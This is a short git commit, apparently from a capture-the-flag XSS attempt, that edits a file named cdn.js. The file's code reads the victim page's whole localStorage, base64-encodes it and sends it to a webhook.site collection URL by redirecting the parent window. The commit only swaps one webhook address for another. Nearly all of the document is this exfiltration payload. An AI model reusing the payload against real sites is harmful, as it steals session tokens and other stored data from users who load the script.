c9636d91731811a2dc512825acc7dfc2ef97ff91
Manaf941 <manaf@2221.ch>
2024-04-12 01:14:53 +0200

    Update cdn.js

--- cdn.js
+++ cdn.js
@@ -1,3 +1,3 @@
 const flag = JSON.stringify({ ...localStorage })
 
-window.parent.document.location = `https://webhook.site/25a9a1e9-e5dc-49d2-8c32-85847db2ddb9?flag=${encodeURIComponent(btoa(flag))}`
+window.parent.document.location = `https://webhook.site/40a6771d-b79d-4ea5-bbb3-df68cdcf56b7?flag=${encodeURIComponent(btoa(flag))}`
